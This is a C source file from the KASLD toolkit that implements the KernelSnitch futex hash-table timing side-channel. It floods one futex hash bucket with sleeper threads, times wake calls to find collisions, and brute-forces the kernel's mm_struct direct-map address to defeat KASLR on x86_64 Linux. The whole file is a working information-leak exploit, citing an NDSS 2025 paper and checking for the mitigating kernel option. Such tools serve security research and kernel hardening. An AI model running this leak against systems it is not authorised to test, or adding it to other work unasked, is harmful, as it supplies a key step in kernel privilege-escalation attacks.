// This file is part of KASLD - https://github.com/bcoles/kasld
//
// KernelSnitch: Futex hash table timing side-channel to leak mm_struct address.
//
// Exploits the fact that the kernel's global futex hash table hashes
// (mm_struct pointer, user-space address) via jhash2(). By piling 4096
// FUTEX_WAIT_PRIVATE sleepers onto a single address (flooding one hash
// bucket), then probing other addresses with timed FUTEX_WAKE_PRIVATE
// calls, we identify collision addresses — those whose hash bucket
// contains 4096 entries and thus takes much longer to traverse.
//
// Knowing which user-space addresses collide (same bucket) and which
// do not, a brute-force search over candidate mm_struct kernel
// addresses finds the unique value that produces the observed collision
// pattern under jhash2.
//
// Leaks current->mm (mm_struct kernel heap address in the direct-map
// region). KASLD reports this as a directmap address.
//
// Works on x86_64 Linux kernels without CONFIG_FUTEX_PRIVATE_HASH
// (mainline < ~v6.14, Ubuntu <= 6.8, most distro kernels as of 2025).
//
// Requires: ~64 GB virtual address space (MAP_NORESERVE, no physical
// RAM consumed), ~4096 threads for pile-up, multi-threaded brute-force
// search (~1–30 minutes depending on physical RAM size).
//
// Based on: "KernelSnitch: Side-Channel Attacks on Kernel Data
// Structures" (Maar et al., NDSS 2025)
//
// References:
// https://lukasmaar.github.io/papers/ndss25-kernelsnitch.pdf
// https://github.com/IAIK/KernelSnitch
// ---
// <bcoles@gmail.com>

#if !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld.h"
#include <errno.h>
#include <limits.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

/* =========================================================================
 * Constants
 * =========================================================================
 */

/* Futex region: 64 GB virtual address space for diverse probe addresses.
 * MAP_NORESERVE — no physical pages committed until touched.  Only the
 * single pile-up page is faulted in. */
#define FUTEX_REGION_SZ (64UL * GB)

/* Number of sleeper threads piled onto one hash bucket. */
#define NUM_SLEEPERS 4096

/* Timing: take MEASUREMENTS samples, sort, average the lowest LOWEST_N. */
#define MEASUREMENTS 128
#define LOWEST_N 8

/* A probe whose timing exceeds baseline * COLLISION_MULT is a collision. */
#define COLLISION_MULT 4

/* Maximum candidate addresses from quick scan (pass 1). */
#define MAX_CANDIDATES 4096

/* Number of collision addresses to collect for cross-validation. */
#define MAX_COLLISIONS 16

/* Minimum usable collisions for the brute-force (fewer = more false
 * positives, but still astronomically unlikely with hashsize 4096). */
#define MIN_COLLISIONS 4

/* Kernel futex private-key offset: for FUTEX_*_PRIVATE operations, the
 * offset field is just (address & (PAGE_SIZE-1)). FUT_OFF_MMSHARED (2)
 * is only set for shared anonymous mappings, NOT for private futexes. */

/* x86_64 direct-map KASLR range for page_offset_base. */
#define POB_MIN 0xffff888000000000UL
#define POB_MAX 0xffffc88000000000UL
#define POB_ALIGN (1UL << 30) /* PUD_SIZE = 1 GiB */

/* Common mm_struct object sizes on Ubuntu/Debian kernels (bytes).
 *
 * gcd(size, 4096) determines valid address alignment:
 *   gcd=1024: 1024
 *   gcd=512:  1536
 *   gcd=256:  1280
 *   gcd=128:  1152
 *   gcd=64:   1088, 1216, 1344, 1408, 1472
 *
 * When the size is unknown, we search in GCD-based tiers:
 *   tier 1 (step=128): covers 1024, 1152, 1280, 1536 in one pass.
 *   tier 2 (step=64):  covers 1088, 1216, 1344, 1408, 1472 in one pass.
 *
 * This avoids exhausting each size sequentially, which wastes time
 * when the correct size has a small GCD (e.g. 1152, gcd=128). */

/* Cache-flush buffer for structure-agnostic amplification. */
#define FLUSH_BUF_SZ (128UL * KB)

/* =========================================================================
 * jhash2 — Bob Jenkins' hash (kernel-compatible)
 *
 * Reimplemented from include/linux/jhash.h (GPL-2.0).
 * =========================================================================
 */

#define JHASH_INITVAL 0xdeadbeef

#define __jhash_mix(a, b, c)                                                   \
  do {                                                                         \
    (a) -= (c);                                                                \
    (a) ^= ((c) << 4) | ((c) >> 28);                                           \
    (c) += (b);                                                                \
    (b) -= (a);                                                                \
    (b) ^= ((a) << 6) | ((a) >> 26);                                           \
    (a) += (c);                                                                \
    (c) -= (b);                                                                \
    (c) ^= ((b) << 8) | ((b) >> 24);                                           \
    (b) += (a);                                                                \
    (a) -= (c);                                                                \
    (a) ^= ((c) << 16) | ((c) >> 16);                                          \
    (c) += (b);                                                                \
    (b) -= (a);                                                                \
    (b) ^= ((a) << 19) | ((a) >> 13);                                          \
    (a) += (c);                                                                \
    (c) -= (b);                                                                \
    (c) ^= ((b) << 4) | ((b) >> 28);                                           \
    (b) += (a);                                                                \
  } while (0)

#define __jhash_final(a, b, c)                                                 \
  do {                                                                         \
    (c) ^= (b);                                                                \
    (c) -= ((b) << 14) | ((b) >> 18);                                          \
    (a) ^= (c);                                                                \
    (a) -= ((c) << 11) | ((c) >> 21);                                          \
    (b) ^= (a);                                                                \
    (b) -= ((a) << 25) | ((a) >> 7);                                           \
    (c) ^= (b);                                                                \
    (c) -= ((b) << 16) | ((b) >> 16);                                          \
    (a) ^= (c);                                                                \
    (a) -= ((c) << 4) | ((c) >> 28);                                           \
    (b) ^= (a);                                                                \
    (b) -= ((a) << 14) | ((a) >> 18);                                          \
    (c) ^= (b);                                                                \
    (c) -= ((b) << 24) | ((b) >> 8);                                           \
  } while (0)

/* Hash exactly 4 u32 words with initval (matches kernel futex path). */
static inline uint32_t jhash2_4(const uint32_t *k, uint32_t initval) {
  uint32_t a, b, c;
  a = b = c = JHASH_INITVAL + (4u << 2) + initval;
  a += k[0];
  b += k[1];
  c += k[2];
  __jhash_mix(a, b, c);
  a += k[3];
  __jhash_final(a, b, c);
  return c;
}

/* Compute the futex hash bucket for a private futex.
 *
 * Mirrors the kernel's hash_futex() with private futex key layout:
 *   key.private.mm      = mm           (bytes 0-7)
 *   key.private.address = addr & ~FFF  (bytes 8-15)
 *   key.private.offset  = addr & FFF   (bytes 16-19, used as initval)
 *
 * For page-aligned addresses, offset = 0, so initval = 0. */
static inline uint32_t futex_bucket(unsigned long mm, unsigned long uaddr,
                                    unsigned int hashsize) {
  uint32_t k[4];
  unsigned long page_addr = uaddr & ~(PAGE_SIZE - 1);
  unsigned int offset = (unsigned int)(uaddr & (PAGE_SIZE - 1));
  k[0] = (uint32_t)(mm & 0xffffffff);
  k[1] = (uint32_t)(mm >> 32);
  k[2] = (uint32_t)(page_addr & 0xffffffff);
  k[3] = (uint32_t)(page_addr >> 32);
  return jhash2_4(k, offset) & (hashsize - 1);
}

/* =========================================================================
 * rdtsc helpers (Intel)
 * =========================================================================
 */

static inline uint64_t rdtsc_begin(void) {
  uint32_t a, d;
  __asm__ __volatile__("mfence");
  __asm__ __volatile__("rdtsc" : "=a"(a), "=d"(d));
  __asm__ __volatile__("lfence");
  return ((uint64_t)d << 32) | a;
}

static inline uint64_t rdtsc_end(void) {
  uint32_t a, d;
  __asm__ __volatile__("lfence");
  __asm__ __volatile__("rdtsc" : "=a"(a), "=d"(d));
  __asm__ __volatile__("mfence");
  return ((uint64_t)d << 32) | a;
}

/* =========================================================================
 * Utility
 * =========================================================================
 */

static unsigned int roundup_pow2(unsigned int v) {
  v--;
  v |= v >> 1;
  v |= v >> 2;
  v |= v >> 4;
  v |= v >> 8;
  v |= v >> 16;
  return v + 1;
}

static int cmp_u64(const void *a, const void *b) {
  uint64_t va = *(const uint64_t *)a;
  uint64_t vb = *(const uint64_t *)b;
  return (va > vb) - (va < vb);
}

/* Read an unsigned long from a sysfs file.  Returns 0 on failure. */
static unsigned long read_sysfs_ulong(const char *path) {
  FILE *f = fopen(path, "r");
  if (!f)
    return 0;
  unsigned long val = 0;
  if (fscanf(f, "%lu", &val) != 1)
    val = 0;
  fclose(f);
  return val;
}

/* =========================================================================
 * Phase 1: Pile-up — flood one hash bucket with FUTEX_WAIT sleepers
 * =========================================================================
 */

static volatile char *futex_region;
static unsigned long pile_addr;
static pthread_t sleeper_tids[NUM_SLEEPERS];
static int num_sleepers_created;

static void *sleeper_fn(void *arg) {
  (void)arg;
  /* Block on the pile-up futex.  The anonymous page is zero-filled,
   * and we pass val=0, so the WAIT succeeds and the thread sleeps. */
  syscall(SYS_futex, (int *)pile_addr, FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0);
  return NULL;
}

static int create_pileup(void) {
  futex_region =
      (volatile char *)mmap(NULL, FUTEX_REGION_SZ, PROT_READ | PROT_WRITE,
                            MAP_ANONYMOUS | MAP_PRIVATE | MAP_NORESERVE, -1, 0);
  if (futex_region == MAP_FAILED) {
    fprintf(stderr, "[-] kernelsnitch: mmap %lu GiB failed: %s\n",
            (unsigned long)(FUTEX_REGION_SZ / GB), strerror(errno));
    return -1;
  }

  pile_addr = (unsigned long)futex_region;

  /* Touch the pile-up page so the kernel maps it (zero page). */
  *(volatile int *)pile_addr;

  pthread_attr_t attr;
  pthread_attr_init(&attr);
  pthread_attr_setstacksize(&attr, PTHREAD_STACK_MIN);

  num_sleepers_created = 0;
  for (int i = 0; i < NUM_SLEEPERS; i++) {
    if (pthread_create(&sleeper_tids[i], &attr, sleeper_fn, NULL) != 0)
      break;
    num_sleepers_created++;
  }
  pthread_attr_destroy(&attr);

  if (num_sleepers_created < 256) {
    fprintf(stderr,
            "[-] kernelsnitch: only %d sleeper threads created "
            "(need >= 256)\n",
            num_sleepers_created);
    return -1;
  }

  /* Let threads settle into FUTEX_WAIT. */
  usleep(200000);

  fprintf(stderr, "[.] pile-up: %d sleepers on bucket for addr %lx\n",
          num_sleepers_created, pile_addr);
  return 0;
}

static void cleanup_pileup(void) {
  /* Wake all sleepers. */
  syscall(SYS_futex, (int *)pile_addr, FUTEX_WAKE_PRIVATE, INT_MAX, NULL, NULL,
          0);
  for (int i = 0; i < num_sleepers_created; i++)
    pthread_join(sleeper_tids[i], NULL);

  if (futex_region && futex_region != MAP_FAILED)
    munmap((void *)futex_region, FUTEX_REGION_SZ);
}

/* =========================================================================
 * Phase 2: Find collision addresses via timed FUTEX_WAKE probes
 * =========================================================================
 */

static volatile char flush_buf[FLUSH_BUF_SZ];

static uint64_t measure_wake(unsigned long addr) {
  uint64_t samples[MEASUREMENTS];

  for (int i = 0; i < MEASUREMENTS; i++) {
    sched_yield();
    /* Structure-agnostic amplification: flush CPU caches so the
     * kernel hash-table traversal incurs cache misses. */
    memset((char *)flush_buf, 1, sizeof(flush_buf));

    uint64_t t0 = rdtsc_begin();
    syscall(SYS_futex, (int *)addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0);
    uint64_t t1 = rdtsc_end();
    samples[i] = t1 - t0;
  }

  qsort(samples, MEASUREMENTS, sizeof(uint64_t), cmp_u64);

  uint64_t sum = 0;
  for (int i = 0; i < LOWEST_N; i++)
    sum += samples[i];
  return sum / LOWEST_N;
}

static int find_collisions(unsigned long *collisions, int *num_collisions,
                           unsigned int hashsize) {
  /* Scale probe count: we need enough probes to expect ~4x MAX_COLLISIONS
   * hits.  Each probe has a 1/hashsize chance of colliding.  For small
   * hashtables (4 CPUs → hashsize=1024): 65536 probes → ~64 expected hits.
   * For large hashtables (128 CPUs → hashsize=32768): need ~2M probes. */
  unsigned long num_probes = (unsigned long)hashsize * MAX_COLLISIONS * 4;
  if (num_probes < 65536)
    num_probes = 65536;
  unsigned long max_probes = FUTEX_REGION_SZ / PAGE_SIZE;
  if (num_probes > max_probes)
    num_probes = max_probes;

  /* Measure baseline on an address far from the pile-up (unlikely to
   * collide — probability 1/hashsize). */
  unsigned long baseline_addr =
      (unsigned long)(futex_region + FUTEX_REGION_SZ / 2);
  uint64_t baseline = measure_wake(baseline_addr);

  if (baseline == 0) {
    fprintf(stderr, "[-] kernelsnitch: baseline timing is zero\n");
    return -1;
  }

  uint64_t quick_threshold = baseline * COLLISION_MULT;
  uint64_t confirm_threshold = baseline * COLLISION_MULT;

  unsigned long stride = FUTEX_REGION_SZ / num_probes;
  stride = (stride + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
  if (stride < PAGE_SIZE)
    stride = PAGE_SIZE;

  fprintf(stderr,
          "[.] probe: baseline=%lu cycles, num_probes=%lu, "
          "hashsize=%u, stride=%lu\n",
          (unsigned long)baseline, num_probes, hashsize, stride);

  *num_collisions = 0;

  /* Pass 1: Quick scan — single measurement without cache flush.
   * The collision signal is typically 100-300x baseline (4096 bucket
   * entries to traverse), so a single sample reliably identifies
   * candidates even without amplification. */
  unsigned long candidates[MAX_CANDIDATES];
  int num_candidates = 0;

  for (unsigned long i = 1; num_candidates < MAX_CANDIDATES; i++) {
    unsigned long probe = (unsigned long)futex_region + i * stride;
    if (probe >= (unsigned long)futex_region + FUTEX_REGION_SZ)
      break;
    if (probe == pile_addr)
      continue;

    uint64_t t0 = rdtsc_begin();
    syscall(SYS_futex, (int *)probe, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0);
    uint64_t t1 = rdtsc_end();

    if (t1 - t0 > quick_threshold)
      candidates[num_candidates++] = probe;
  }

  fprintf(stderr, "[.] quick scan: %d candidates\n", num_candidates);

  /* Pass 2: Confirm candidates with full precision measurement
   * (cache-flush amplification + statistical filtering). */
  for (int i = 0; i < num_candidates && *num_collisions < MAX_COLLISIONS; i++) {
    uint64_t t = measure_wake(candidates[i]);
    if (t > confirm_threshold) {
      collisions[*num_collisions] = candidates[i];
      (*num_collisions)++;
      fprintf(stderr, "[.] collision #%d: addr=%lx time=%lu\n", *num_collisions,
              candidates[i], (unsigned long)t);
    }
  }

  fprintf(stderr,
          "[.] found %d collision addresses "
          "(need >= %d for brute-force)\n",
          *num_collisions, MIN_COLLISIONS);
  return (*num_collisions >= MIN_COLLISIONS) ? 0 : -1;
}

/* =========================================================================
 * Phase 3: Brute-force search for mm_struct address
 *
 * The mm_struct virtual address lives somewhere in the direct-map region:
 *   mm = page_offset_base + slab_page_phys + k * slab_size
 * where:
 *   - page_offset_base ∈ [POB_MIN, POB_MAX), 1 GiB-aligned
 *   - slab_page_phys is page-aligned (multiple of PAGE_SIZE)
 *   - k ∈ [0, objects_per_slab)
 *
 * The set of valid mm addresses (relative to POB_MIN) is a subset of
 * multiples of gcd(GiB, PAGE_SIZE, slab_size) = gcd(PAGE_SIZE, slab_size).
 * Stepping by this GCD guarantees we visit every possible mm position.
 *
 * When the size is unknown, we search in GCD-based tiers rather than
 * trying each size sequentially: tier 1 at step=128 covers the four
 * most common sizes (1024, 1152, 1280, 1536) simultaneously.
 * =========================================================================
 */

static unsigned long gcd_ul(unsigned long a, unsigned long b) {
  while (b) {
    unsigned long t = b;
    b = a % b;
    a = t;
  }
  return a;
}

struct search_ctx {
  unsigned long pile_addr;
  unsigned long *collisions;
  int num_collisions;
  unsigned int hashsize;
  unsigned long mm_step;
  volatile unsigned long result;
  volatile int done;
  volatile unsigned long progress; /* iterations completed (in units of 1M) */
  unsigned long total_iters;       /* total iterations across all threads */
};

struct thread_arg {
  struct search_ctx *ctx;
  unsigned long mm_start;
  unsigned long mm_end;
};

static void *search_fn(void *arg) {
  struct thread_arg *ta = (struct thread_arg *)arg;
  struct search_ctx *ctx = ta->ctx;
  unsigned long mm_step = ctx->mm_step;
  unsigned int hmask = ctx->hashsize - 1;
  unsigned long local_count = 0;

  /* Precompute loop-invariant hash inputs for pile_addr. */
  unsigned long p_page = ctx->pile_addr & ~(unsigned long)(PAGE_SIZE - 1);
  uint32_t p_off = (uint32_t)(ctx->pile_addr & (PAGE_SIZE - 1));
  uint32_t p_plo = (uint32_t)(p_page & 0xffffffffUL);
  uint32_t p_phi = (uint32_t)(p_page >> 32);
  uint32_t p_base = JHASH_INITVAL + 16u + p_off;

  /* Precompute loop-invariant hash inputs for collisions[0]. */
  unsigned long c0_page = ctx->collisions[0] & ~(unsigned long)(PAGE_SIZE - 1);
  uint32_t c0_off = (uint32_t)(ctx->collisions[0] & (PAGE_SIZE - 1));
  uint32_t c0_plo = (uint32_t)(c0_page & 0xffffffffUL);
  uint32_t c0_phi = (uint32_t)(c0_page >> 32);
  uint32_t c0_base = JHASH_INITVAL + 16u + c0_off;

  for (unsigned long mm = ta->mm_start; mm < ta->mm_end && !ctx->done;
       mm += mm_step) {

    uint32_t mm_lo = (uint32_t)(mm & 0xffffffffUL);
    uint32_t mm_hi = (uint32_t)(mm >> 32);

    /* Inline jhash2 for pile_addr — avoids function call + array build. */
    uint32_t a, b, c;
    a = p_base + mm_lo;
    b = p_base + mm_hi;
    c = p_base + p_plo;
    __jhash_mix(a, b, c);
    a += p_phi;
    __jhash_final(a, b, c);
    uint32_t bucket_pile = c & hmask;

    /* Inline jhash2 for collisions[0]. */
    a = c0_base + mm_lo;
    b = c0_base + mm_hi;
    c = c0_base + c0_plo;
    __jhash_mix(a, b, c);
    a += c0_phi;
    __jhash_final(a, b, c);

    if (__builtin_expect((c & hmask) != bucket_pile, 1)) {
      if (__builtin_expect(++local_count == (1UL << 20), 0)) {
        __sync_fetch_and_add(&ctx->progress, local_count);
        local_count = 0;
      }
      continue;
    }

    /* Check remaining collision constraints (cold path). */
    int match = 1;
    for (int i = 1; i < ctx->num_collisions; i++) {
      if (futex_bucket(mm, ctx->collisions[i], ctx->hashsize) != bucket_pile) {
        match = 0;
        break;
      }
    }

    if (match) {
      ctx->result = mm;
      ctx->done = 1;
      return NULL;
    }

    if (__builtin_expect(++local_count == (1UL << 20), 0)) {
      __sync_fetch_and_add(&ctx->progress, local_count);
      local_count = 0;
    }
  }

  __sync_fetch_and_add(&ctx->progress, local_count);
  return NULL;
}

/* Progress reporter thread — prints percentage every 5 seconds. */
static void *progress_fn(void *arg) {
  struct search_ctx *ctx = (struct search_ctx *)arg;
  while (!ctx->done) {
    sleep(5);
    if (ctx->done)
      break;
    unsigned long done = ctx->progress;
    unsigned long pct = ctx->total_iters ? (done * 100 / ctx->total_iters) : 0;
    fprintf(stderr, "[.] brute-force: %lu%% (%lu/%lu M iterations)\n", pct,
            done / (1024 * 1024), ctx->total_iters / (1024 * 1024));
  }
  return NULL;
}

static unsigned long brute_force_mm(unsigned long *collisions,
                                    int num_collisions, unsigned int hashsize,
                                    unsigned long mm_step,
                                    unsigned long phys_mem) {
  int nthreads = (int)sysconf(_SC_NPROCESSORS_ONLN);
  if (nthreads < 1)
    nthreads = 1;
  if (nthreads > 64)
    nthreads = 64;

  /* The correct scan step is gcd(slab_size, PAGE_SIZE).
   * SLUB places objects at offsets {0, slab_size, 2*slab_size, ...}
   * within page-aligned slab pages.  mm = pob + page_phys + k*slab_size,
   * so valid mm offsets (mod PAGE_SIZE) cycle through
   * {k*slab_size mod PAGE_SIZE}.  Stepping by gcd(slab_size, PAGE_SIZE)
   * hits every such residue. */
  unsigned long step = gcd_ul(mm_step, (unsigned long)PAGE_SIZE);
  unsigned long mm_start = POB_MIN;
  unsigned long mm_end = POB_MAX + phys_mem;
  unsigned long total_iters = (mm_end - mm_start) / step;
  unsigned long per_thread =
      (total_iters + (unsigned long)nthreads - 1) / (unsigned long)nthreads;

  struct search_ctx ctx;
  memset(&ctx, 0, sizeof(ctx));
  ctx.pile_addr = pile_addr;
  ctx.collisions = collisions;
  ctx.num_collisions = num_collisions;
  ctx.hashsize = hashsize;
  ctx.mm_step = step;
  ctx.result = 0;
  ctx.done = 0;
  ctx.progress = 0;
  ctx.total_iters = total_iters;

  pthread_t *tids = calloc((size_t)nthreads, sizeof(pthread_t));
  struct thread_arg *args = calloc((size_t)nthreads, sizeof(struct thread_arg));
  if (!tids || !args) {
    free(tids);
    free(args);
    return 0;
  }

  if (mm_step != step)
    fprintf(stderr,
            "[.] brute-force: %d threads, slab_size=%lu, step=%lu (gcd), "
            "%lu B iterations (%.1f GiB search range)\n",
            nthreads, mm_step, step, total_iters,
            (double)(mm_end - mm_start) / (double)GB);
  else
    fprintf(stderr,
            "[.] brute-force: %d threads, step=%lu, "
            "%lu B iterations (%.1f GiB search range)\n",
            nthreads, step, total_iters,
            (double)(mm_end - mm_start) / (double)GB);

  /* Start progress reporter. */
  pthread_t progress_tid;
  pthread_create(&progress_tid, NULL, progress_fn, &ctx);

  for (int i = 0; i < nthreads; i++) {
    args[i].ctx = &ctx;
    args[i].mm_start = mm_start + (unsigned long)i * per_thread * step;
    args[i].mm_end = mm_start + ((unsigned long)i + 1) * per_thread * step;
    if (args[i].mm_end > mm_end)
      args[i].mm_end = mm_end;
    pthread_create(&tids[i], NULL, search_fn, &args[i]);
  }

  for (int i = 0; i < nthreads; i++)
    pthread_join(tids[i], NULL);

  ctx.done = 1;
  pthread_join(progress_tid, NULL);

  unsigned long result = ctx.result;
  free(tids);
  free(args);
  return result;
}

/* =========================================================================
 * mm_struct size detection
 * =========================================================================
 */

static unsigned long detect_mm_struct_size(void) {
  /* Try sysfs (SLUB exposes object_size; requires relaxed permissions
   * or root). */
  unsigned long sz = read_sysfs_ulong("/sys/kernel/slab/mm_struct/object_size");
  if (sz >= 512 && sz <= 4096) {
    fprintf(stderr, "[.] mm_struct size from sysfs: %lu bytes\n", sz);
    return sz;
  }

  /* Try /proc/slabinfo (readable on some configs). Format:
   * name <active_objs> <num_objs> <objsize> ... */
  FILE *f = fopen("/proc/slabinfo", "r");
  if (f) {
    char line[512];
    while (fgets(line, sizeof(line), f)) {
      char name[64];
      unsigned long active, num, objsize;
      if (sscanf(line, "%63s %lu %lu %lu", name, &active, &num, &objsize) ==
          4) {
        if (strcmp(name, "mm_struct") == 0 && objsize >= 512 &&
            objsize <= 4096) {
          fclose(f);
          fprintf(stderr,
                  "[.] mm_struct size from /proc/slabinfo: "
                  "%lu bytes\n",
                  objsize);
          return objsize;
        }
      }
    }
    fclose(f);
  }

  return 0; /* unknown — caller will try common sizes */
}

/* =========================================================================
 * main
 * =========================================================================
 */

int main(void) {
  if (!getenv("KASLD_EXPERIMENTAL")) {
    fprintf(stderr, "[-] kernelsnitch: experimental component; "
                    "set KASLD_EXPERIMENTAL=1 to enable\n");
    return 1;
  }

  printf("[.] trying KernelSnitch (futex hash timing) ...\n");

  /* Check for CONFIG_FUTEX_PRIVATE_HASH mitigation.  When enabled,
   * private futexes use a per-mm hash table and mm_struct is NOT part
   * of the hash key, making the timing side-channel impossible. */
#ifndef PR_FUTEX_HASH
#define PR_FUTEX_HASH 75
#endif
#define PR_FUTEX_HASH_GET_SLOTS 2
  if (prctl(PR_FUTEX_HASH, PR_FUTEX_HASH_GET_SLOTS, 0, 0, 0) >= 0) {
    fprintf(stderr, "[-] kernelsnitch: CONFIG_FUTEX_PRIVATE_HASH is enabled; "
                    "attack not possible\n");
    return 1;
  }

  /* Determine futex hash table size. */
  long ncpus = sysconf(_SC_NPROCESSORS_CONF);
  if (ncpus < 1)
    ncpus = 1;
  unsigned int hashsize = roundup_pow2((unsigned int)(256 * ncpus));
  if (hashsize < 256)
    hashsize = 256;
  fprintf(stderr, "[.] CPUs: %ld, futex hashsize: %u\n", ncpus, hashsize);

  /* Pin to core 0 for stable timing measurements (Phase 2). */
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(0, &cpuset);
  sched_setaffinity(0, sizeof(cpuset), &cpuset);

  /* Phase 1: Pile-up. */
  if (create_pileup() < 0)
    return 1;

  /* Phase 2: Find collision addresses. */
  unsigned long collisions[MAX_COLLISIONS];
  int num_collisions = 0;
  if (find_collisions(collisions, &num_collisions, hashsize) < 0) {
    fprintf(stderr, "[-] kernelsnitch: insufficient collisions; "
                    "timing signal too noisy?\n");
    cleanup_pileup();
    return 1;
  }

  /* Unpin CPU for the multi-threaded brute-force. */
  CPU_ZERO(&cpuset);
  for (long i = 0; i < ncpus; i++)
    CPU_SET((int)i, &cpuset);
  sched_setaffinity(0, sizeof(cpuset), &cpuset);

  /* Phase 3: Brute-force mm_struct address.
   *
   * Flat scan over [POB_MIN, POB_MAX + phys_mem) in steps of mm_struct
   * size.  ~54 billion iterations per size for objsize=1280. */
  unsigned long phys_mem = (unsigned long)sysconf(_SC_PHYS_PAGES) *
                           (unsigned long)sysconf(_SC_PAGESIZE);
  if (phys_mem == 0)
    phys_mem = 16UL * GB;
  fprintf(stderr, "[.] physical memory: %lu MiB\n", phys_mem / MB);

  unsigned long mm_size = detect_mm_struct_size();
  unsigned long result = 0;

  if (mm_size) {
    /* Known size: single search pass. */
    fprintf(stderr, "[.] searching with mm_struct size %lu ...\n", mm_size);
    result =
        brute_force_mm(collisions, num_collisions, hashsize, mm_size, phys_mem);
  } else {
    /* Unknown size: search in GCD-based tiers.
     *
     * All valid mm addresses lie at multiples of gcd(slab_size, 4096).
     * Searching at the minimum GCD of a size group covers all sizes
     * in that group simultaneously, avoiding redundant sequential passes.
     *
     * Tier 1 (step=128): sizes 1024, 1152, 1280, 1536.
     * Tier 2 (step=64):  sizes 1088, 1216, 1344, 1408, 1472. */
    fprintf(stderr, "[.] tier 1: step=128 (covers sizes "
                    "1024, 1152, 1280, 1536) ...\n");
    result =
        brute_force_mm(collisions, num_collisions, hashsize, 128, phys_mem);

    if (!result) {
      fprintf(stderr, "[.] tier 2: step=64 (covers sizes "
                      "1088, 1216, 1344, 1408, 1472) ...\n");
      result =
          brute_force_mm(collisions, num_collisions, hashsize, 64, phys_mem);
    }
  }

  cleanup_pileup();

  if (!result) {
    fprintf(stderr, "[-] kernelsnitch: brute-force failed to find "
                    "mm_struct address\n");
    return 1;
  }

  printf("leaked mm_struct address: %lx\n", result);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DIRECTMAP, result,
               "kernelsnitch");
  return 0;
}
